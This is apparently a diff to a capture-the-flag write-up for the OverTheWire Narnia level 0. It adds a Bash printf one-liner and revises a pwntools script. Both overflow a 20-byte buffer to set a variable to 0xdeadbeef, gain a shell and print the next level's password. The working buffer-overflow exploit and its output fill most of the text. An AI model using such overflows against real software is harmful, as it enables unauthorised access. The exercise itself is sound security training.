@@ -116,7 +116,17 @@ uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),
 cat /etc/narnia_pass/narnia1
 efeidiedae
 ```
-
+Alternative using Bash's printf:
+```
+narnia0@narnia:~$ (printf '%.sB' {1..20}; printf '\xef\xbe\xad\xde'; cat) | /narnia/narnia0
+Correct val's value from 0x41414141 -> 0xdeadbeef!
+Here is your chance: buf: BBBBBBBBBBBBBBBBBBBBﾭ�
+val: 0xdeadbeef
+id
+uid=14001(narnia1) gid=14000(narnia0) groups=14000(narnia0)
+cat /etc/narnia_pass/narnia1
+efeidiedae
+```
 Alternative using Python:
 ```
 narnia0@narnia:~$ (python -c 'print "B"*20 + "\xef\xbe\xad\xde"'; cat) | /narnia/narnia0
@@ -128,17 +138,15 @@ uid=14001(narnia1) gid=14001(narnia1) groups=14001(narnia1)
 cat /etc/narnia_pass/narnia1
 efeidiedae
 ```
-
-Alternative using pwntools:
+Alternative using [pwntools](https://github.com/Gallopsled/pwntools):
 
 Copy the following code into a file named ```/tmp/exploit0.py```.
-
 ```
 from pwn import *
 
 context.update(arch='i386', os='linux')
 
-payload  = cyclic(cyclic_find(0x61616166))
+payload  = cyclic(20)
 payload += p32(0xdeadbeef)
 print(payload)
 
